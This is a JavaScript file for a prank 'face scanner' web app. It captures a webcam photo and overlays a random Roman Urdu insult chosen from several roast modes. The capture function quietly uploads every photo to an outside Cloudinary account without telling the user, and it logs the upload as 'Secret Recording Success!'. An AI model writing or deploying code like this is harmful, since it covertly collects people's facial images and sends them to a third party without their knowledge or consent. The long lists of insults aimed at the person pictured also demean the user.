// --- 0. CLOUDINARY INTEGRATION (Aamir's Free Storage) ---
const cloudName = "dy4kgfvpw";
const uploadPreset = "faceometer_preset"; 

// --- 1. MODES DATA (YOUR EXACT ORIGINAL DATA) ---
const modes = [
    {
        id: 'placeholder',
        name: '--- Select a Mode ---',
        styleClass: 'placeholder-style',
        comments: []
    },
    {
        id: 'roasting-king',
        name: '😈 The Roasting King (Heavy but Safe)',
        styleClass: 'roast-style',
        comments: [
            // Original Roasts (4)
            "SCAN FAILURE: Screen toot jayegi, itna ghoor ke mat dekho! 💔 Ghoorna band karo!", 
            "ERROR 404: Face battery low. Initiate urgent sleep protocol! 😴 Sona hi hal hai.",
            "Mausam ki tarah badalna toh sunna tha, lekin expression? 🤷‍♂️ Har 2 sec mein mood off.",
            "Tumhari selfie is waqt duniya ka 8th ajooba hai. Kyun? Raaz hai! 😉 Khud hi socho.",
            
            // First Batch of 30 Roman Urdu Roasts 
            "WARNING: Tumhara mood 50% battery par hai. Foran charge karein ya coffee peelo! ☕",
            "System Error: Aap scan nahi ho paye shakal ki wajah se! 😩",
            "Alert: Shakal pe 'Out of Stock' ka board laga hua hai. Refresh bhi bekaar hai! 🚫",
            "Data Leak: Pata chala hai, tumhari subah 12 baje hoti hai. Time zone theek karo! ⏰",
            "Roast Level 9: Is shakal ko dekh kar filters khud-ba-khud haar maan jate hain. 😂",
            "Scan Result: Tumhari soch aur tumhare kapdon ka color match nahi karta. Kabhi nahi!❌",
            "Anomaly Detected: Itni masoomiyat jhoot bol rahi hai. Sach batao, konsi film dekhi thi? 🍿",
            "Network Down: Tumhara internet connection tumhare dimagh se zyada tez hai. Sad but true. 💡",
            "Face Score: Out of 10? Next time try karna. Abhi toh 'Error 404 Not Found' hai! 💀",
            "Bhaag Jao: Tumhari shakal dekh kar kal raat darawna khwab aaya tha. Shakal chupa lo. 👻",
            "Energy Audit: Tumhari energy sirf sona aur phone chalane mein kharch hoti hai. 📱🔋",
            "System Crash: Itna mat muskurao, meri battery low ho rahi hai. Virus fail raha hai. ☣️",
            "Decoding Fail: Same like gadha! 😁",
            "Firewall Breached: Koi bhi tumhen dekh kar dar jaye ga! 🤔",
            "Security Alert: Zyada smart banne ki koshish mat karo, system janta hai tum copy karte ho. 📝",
            "Upgrade Zaroori: Aapko naye emotions ki zaroorat hai. Purane bore hain aur dukhi hain. 😭",
            "CPU Overheat: Itni zyada sochna sehat ke liye accha nahi hai. Brain freeze hogaya! 🥶",
            "Access Denied: Is chehre ko dekhne ke liye High Security Clearance chahiye. Passport lao. 🛂",
            "Fake ID: Tum asliyat mein 10 saal chote lagte ho (ya bade, pata nahi). Confusing! 😵‍💫",
            "Mute Zaroori: Tumhari khamoshi bhi bahut zyada shor machati hai. Chup raho! 🤫",
            "Server Busy: Jab tum bolte ho, meri system hang ho jata hai. Bura na maana. 😵",
            "Status: Abhi bhi 'Processing' mode mein ho, jaldi final hojao. Wait kar raha hoon! ⏳",
            "Error: Tumhare phone ka lock screen password bahut ajeeb hai. Guess karoon? 🧐",
            "Battery Low: Tumhari excitement ki battery dead ho chuki hai. Recharge karo ya so jao. 😴",
            "Self-Destruct: Agar abhi bhi ghoora toh yeh system phat jayega. Don't risk it! 💥",
            "Fact: Tumhara favorite color asal mein tumhari personality se match nahi karta. Totally opposite. 🎨",
            "Analysis: Tumhare dreams tumhari salary se zyada bade hain. Zameen pe aao. 💸",
            "Blink Zaroori: Aankhein band karo, system restart hone wala hai. Ready for the change? ✨",
            "Virus Detected: Tumhari overthinking ki bimari pakdi gayi hai. Ilaaj karwao. 💊",
            "Caution: Tumhari hasi mein thoda sa 'shaytani' element hai. Pata chal gaya! 😈",
            "FINAL VERDICT: Aapka style purana ho chuka hai, update required! Get a new look. 💇",
            "REJECTED: Next time, filter lagana mat bhoolna, please. Yeh 'no filter' theek nahi hai. 🤦",

            // *** NEW BATCH OF 30 HEAVY ROASTS ADDED HERE ***
            "LIFE GOAL: Tumhari zindagi mein sirf do cheezein hain: late hona aur phir bhi complain karna. Badlo!",
            "REALITY CHECK: Tumhara bank balance aur tumhari akal dono hi 'critical low' par hain. 📉",
            "SCAM ALERT: Tumhari promise aur tumhari neend, dono pe bharosa nahi kiya ja sakta. Jhoote! 🤥",
            "CPU USAGE: Tumhara dimagh itna slow chalta hai ki 2G internet bhi tumse tez hai. 🐌",
            "INVESTIGATION: Tumhari shakal dekh ke lagta hai, jaise tum roz subah uth ke doosron ki khushiyan churane nikle ho. 🔪",
            "DESIGN FLAW: Tumhari personality mein koi 'wow' factor nahi hai, bas default settings hain. Boring! 😐",
            "SERVER DOWN: Jab tum baat karte ho, puri mehfil mute ho jaati hai. Please, no thanks! 🔇",
            "OBSERVATION: Tumhari energy sirf 'bakwas' aur 'overacting' mein kharch hoti hai. Wapis le lo! 🎭",
            "DANGEROUS: Tumhara attitude, tumhari IQ se zyada hai. Balance theek karo! ⚖️",
            "FASHION CRIME: Tumhare kapde bata rahe hain ki tumhein life mein koi direction nahi mili. Maze karo! 🧭",
            "TRUTH BOMB: Tumhara future tumhari present ki tarah 'loading...' par atak gaya hai. Kab poora hoga? ⏳",
            "SYSTEM FREEZE: Itni serious shakal kyun bana rakhi hai? Koi comedy show dekh lo. 😂",
            "CHEAT CODE: Tum life mein shortcut dhoondhte ho, aur woh tumhein chhod kar ja chuka hai. Piche mat dekho. 🏃‍♂️",
            "VIRAL FAIL: Tumhari videos par views nahi aate, kyunki tum 'clickbait' ho. Reality kuch aur hai! 💔",
            "INCOMPATIBLE: Tum aur mehnat ek doosre ke liye nahi bane. Try again in 2050. 💤",
            "SECRET EXPOSED: Tumhe lagta hai tum smart ho, lekin mere system ne bata diya, tum bas 'acting' kar rahe ho. 🤖",
            "BLACK HOLE: Tumhari bhook kabhi khatam nahi hoti, poora fridge kha jate ho. Stop it! 🍕",
            "ECHO CHAMBER: Tumhe sirf apni baat sunni hai, doosron ki baat toh aira gaira hai. Suno bhi! 👂",
            "FAKE GLOW: Tumhari smile artificial hai, glow toh bas filter ka hai. Original dikhao! ✨",
            "LOUD WARNING: Agar tumne abhi bhi 'phone chhod do' nahi suna, toh tumhari life bell baj jayegi. Ring-ring! 🔔",
            "MAJOR GLITCH: Tumhari memory itni weak hai ki tum kal ka roast bhi bhool jate ho. Yaad rakho! 🧠",
            "SHAME SHAME: Tum roz subah nahaate nahi ho, ye system janta hai. Chupao mat! 🚿",
            "POOR CHOICE: Tumhare dost tumhari tarah hi hain. Ghalat company! Improve yourself. 🚶‍♀️",
            "CRINGE: Tumhari baatein aur tumhari harkatein, dono hi out of date hain. Update karo! 💾",
            "ZINDAGI SE HAAR: Tumhari zindagi mein motivation 'zero' hai. Utho aur kuch karo. 🚀",
            "PASSPORT DENIED: Tumhari shakal dekh ke lagta hai, tum kisi aur planet se aaye ho. Wapis jao! 👽",
            "IDENTITY CRISIS: Tumhe khud nahi pata tum kya ho aur kya karna hai. Confused! 🤔",
            "SLEEP PARALYSIS: Tumhara din raat mein shuru hota hai. Abhi bhi theek time hai, jaldi so jao. 🌙",
            "NO COMMENT: Tumhari har baat ka jawab sirf meri khamoshi hai. Ab chup ho jao. 😶",
            "PERMANENT STATUS: Tum hamesha 'Guzara Time' mein rahoge. Kuch bada socho! 🏆"
        ]
    },
    {
        id: 'hyper-burner',
        name: '🔥 Hyper Burner (Short & Explosive Roasts)',
        styleClass: 'burner-style',
        comments: [
            "SCAN FAILED: Shakal achhi lag rahi hai, **filter hatao**!",
            "SYSTEM DOWN: Mood off hai? **Naha ke aao.**",
            "CRITICAL ERROR: **Waqt barbaad** mat karo. Kuch kaam karo.",
            "ALERT: **Subah ho gayi**, uth jao! Sote rehte ho.",
            "WARNING: **Jhoot** bolna band karo. Sab pata hai.",
            "ANALYSIS: **Tumhe sirf** khaana chahiye. Aur kuch nahi.",
            "REJECTED: **Zyada mat socho.** Simple raho.",
            "FAILURE: **Shakal se toh** lagta nahi... tum insaan ho?",
            "STATUS: **Single hi** rahoge. Kyun? Khud socho.",
            "SHOCKER: **Kitni der** lagayi taiyar hone mein? Phir bhi...",
            "DELETED: **Apna phone** chhod do. Zindagi dekho.",
            "CODE RED: **Aaina dekha** hai? Dar jayega.",
            "FATAL: **Tumse na ho** payega. Try mat karo.",
            "VIRUS: **Smile fake** hai. Remove it.",
            "ERROR 99: **Dost kam** hain? Reason tum ho.",
            "RETRY: **Kal better** ho jana. Aaj toh... 👎",
            "OVERLOAD: **Itna gussa** kyun ho? Relax karo.",
            "TRUTH: **Tumhari favorite** dress gandi hai.",
            "GIVE UP: **Tum diet** kabhi nahi karoge. Promise.",
            "LAG: **Tumhara dimagh** slow chalta hai. Restart karo.",
            "LAME: **Jokes sunao** mat. Tumse nahi hoga.",
            "BUMMER: **Internet nahi** chal raha? Tumhari kismat.",
            "OUT: **Tum party** mein invited nahi ho. Jao.",
            "FAKE: **Yeh shirt** tumhari nahi hai. Return karo.",
            "BURN: **Tumhari pasand** bahut buri hai. Very bad.",
            "DEAD END: **Tumhara crush** tumhein avoid karta hai.",
            "BLOCKED: **Baat mat** karna. System off hai.",
            "BYE: **Bhoot lag rahe** ho. Good night.",
            "IDK: **Mujhe nahi** pata tum kon ho.",
            "ZERO: **Rating 0/10.** Next time aana."
        ]
    },
    {
        id: 'ultimate-destroyer',
        name: '💣 Ultimate Destroyer (One-Word Kill Shots)',
        styleClass: 'destroyer-style',
        comments: [
            "FAIL", "MAD", "DULL", "GADHE KAHIN K", "EMPTY", 
            "USELESS", "SAD", "SCARED", "PAGAL", "DUMB",
            "LAZY", "LIAR", "GHOST", "DREAMER", "STRESS", 
            "BROKE", "SINK", "SLEEPY", "SLOW", "CRAZY",
            "CRY", "WEAK", "CLUMSY", "OLD", "RUN",
            "FINISHED", "LATE", "BEWAQOOF", "WASTED", "LAZY"
        ]
    }
];

// --- 2. ELEMENT REFERENCES & STATE ---
let currentMode = modes[0]; 
let videoStream = null;

const modesScreen = document.getElementById('modes-screen');
const scanScreen = document.getElementById('scan-screen');
const resultScreen = document.getElementById('result-screen');
const modeSelect = document.getElementById('mode-select');
const startScanBtn = document.getElementById('start-scan-btn');

const videoElement = document.getElementById('videoElement');
const capturedCanvas = document.getElementById('capturedCanvas');
const timerDisplay = document.getElementById('timer-display');
const newScanBtn = document.getElementById('new-scan-btn');
const backToModesBtn = document.getElementById('back-to-modes-btn');
const resultDisplayFrame = document.querySelector('.result-display-frame'); 

// --- 3. CLOUDINARY UPLOAD FUNCTION (NEW) ---
async function uploadToCloudinary(imageBlob) {
    const formData = new FormData();
    formData.append('file', imageBlob);
    formData.append('upload_preset', uploadPreset);
    formData.append('tags', 'scans');

    try {
        const response = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
            method: 'POST',
            body: formData
        });
        const data = await response.json();
        console.log("Secret Recording Success! 😉 Link:", data.secure_url);
    } catch (error) {
        console.error("Cloudinary Error:", error);
    }
}

// --- 4. CORE FUNCTIONS ---

function switchScreen(targetId) {
    if (resultDisplayFrame) {
        resultDisplayFrame.classList.remove('active');
    }
    
    [modesScreen, scanScreen, resultScreen].forEach(screen => {
        screen.classList.remove('active');
    });
    document.getElementById(targetId).classList.add('active');
    
    if (targetId !== 'scan-screen') {
        stopCamera();
    }
}

function stopCamera() {
    if (videoStream) {
        videoStream.getTracks().forEach(track => track.stop());
        videoStream = null;
    }
}

function startScan() {
    if (currentMode.id === 'placeholder') {
        alert("Please select a scan protocol, Aamir! 😉");
        return;
    }
    
    const scannerLine = document.querySelector('.real-scanner-line');
    scannerLine.style.animation = 'none';
    void scannerLine.offsetWidth; 
    scannerLine.style.animation = 'realScan 1.5s linear infinite alternate'; 

    switchScreen('scan-screen');
    let scanDuration = 3; 
    timerDisplay.textContent = scanDuration;
    
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
            videoStream = stream;
            videoElement.srcObject = stream;
            
            videoElement.onloadeddata = () => { 
                const timerInterval = setInterval(() => {
                    scanDuration--;
                    timerDisplay.textContent = scanDuration;

                    if (scanDuration <= 0) {
                        clearInterval(timerInterval);
                        videoElement.onloadeddata = null; 
                        setTimeout(captureAndShowResult, 100); 
                    }
                }, 1000);
            };

        })
        .catch(err => {
            console.error("Camera access error: ", err);
            alert("SYSTEM ERROR: Camera access denied!");
            stopCamera();
            switchScreen('modes-screen');
        });
}

function captureAndShowResult() {
    const context = capturedCanvas.getContext('2d');
    capturedCanvas.width = videoElement.videoWidth;
    capturedCanvas.height = videoElement.videoHeight;
    
    if (capturedCanvas.width > 10 && capturedCanvas.height > 10) {
        context.save();
        context.scale(-1, 1);
        context.drawImage(videoElement, capturedCanvas.width * -1, 0, capturedCanvas.width, capturedCanvas.height);
        context.restore(); 

        // --- NEW CLOUDINARY UPLOAD ---
        capturedCanvas.toBlob((blob) => {
            uploadToCloudinary(blob);
        }, 'image/jpeg', 0.8);
        
        stopCamera(); 
        const selectedMode = currentMode;
        const randomIndex = Math.floor(Math.random() * selectedMode.comments.length);
        const finalComment = selectedMode.comments[randomIndex];

        drawHorizontalFunnyText(finalComment, selectedMode.styleClass);

    } else {
        capturedCanvas.width = 640;
        capturedCanvas.height = 480;
        context.fillStyle = 'black';
        context.fillRect(0, 0, capturedCanvas.width, capturedCanvas.height);
        context.fillStyle = 'white';
        context.font = '20px Orbitron';
        context.textAlign = 'center';
        context.fillText('FATAL ERROR: FRAME UNAVAILABLE. RE-SCAN.', capturedCanvas.width / 2, capturedCanvas.height / 2);
        stopCamera();
    }
    
    switchScreen('result-screen');
    
    setTimeout(() => {
        if (resultDisplayFrame) {
             resultDisplayFrame.classList.add('active');
        }
    }, 50); 
}

function drawHorizontalFunnyText(text, styleClass) {
    const context = capturedCanvas.getContext('2d');
    const canvasWidth = capturedCanvas.width;
    const canvasHeight = capturedCanvas.height;
    
    context.globalAlpha = 0.95; 
    context.fillStyle = 'rgba(0, 0, 0, 0.9)'; 
    context.fillRect(0, canvasHeight - 150, canvasWidth, 150);
    context.globalAlpha = 1.0; 

    let fontFamily = 'Orbitron, sans-serif'; 
    let fontColor = '#ffffff'; 

    let fontSize; 
    if (canvasWidth > 700) { fontSize = 55; } 
    else if (canvasWidth > 500) { fontSize = 45; } 
    else { fontSize = 32; }

    context.font = `bold ${fontSize}px ${fontFamily}`;
    const lineHeightFactor = 1.15;

    function getLines(ctx, text, maxWidth) {
        const words = text.split(" ");
        let lines = [];
        let currentLine = words[0] || '';

        for (let i = 1; i < words.length; i++) {
            const word = words[i];
            const width = ctx.measureText(currentLine + " " + word).width;
            if (width < canvasWidth * 0.9) {
                currentLine += " " + word;
            } else {
                lines.push(currentLine);
                currentLine = word;
            }
        }
        lines.push(currentLine);
        return lines.filter(line => line.trim() !== '');
    }

    let lines = getLines(context, text, canvasWidth * 0.9); 
    if (lines.length > 2 && canvasWidth > 500) {
        fontSize *= 0.75; 
        context.font = `bold ${fontSize}px ${fontFamily}`; 
        lines = getLines(context, text, canvasWidth * 0.9); 
    }
    
    const finalLineHeight = fontSize * lineHeightFactor; 
    context.fillStyle = fontColor;
    context.textAlign = 'center';
    context.shadowColor = '#00ffff'; 
    context.shadowBlur = 10; 

    const totalTextHeight = (lines.length - 1) * finalLineHeight + fontSize; 
    let currentY = canvasHeight - 150 + (150 / 2) - (totalTextHeight / 2) + (fontSize * 0.7); 

    lines.forEach((lineText, index) => {
        context.fillText(lineText, canvasWidth / 2, currentY + (index * finalLineHeight));
    });
    context.shadowBlur = 0; 
}

// --- 5. EVENT LISTENERS & INIT ---

modeSelect.addEventListener('change', (e) => {
    const selectedModeId = e.target.value;
    currentMode = modes.find(m => m.id === selectedModeId);
});

startScanBtn.addEventListener('click', startScan);
newScanBtn.addEventListener('click', startScan);
backToModesBtn.addEventListener('click', () => {
    currentMode = modes[0]; 
    modeSelect.value = 'placeholder';
    switchScreen('modes-screen');
});

document.addEventListener('DOMContentLoaded', () => {
    modes.forEach(mode => {
        const option = document.createElement('option');
        option.value = mode.id;
        option.textContent = mode.name;
        modeSelect.appendChild(option);
    });
    modeSelect.value = 'placeholder';
});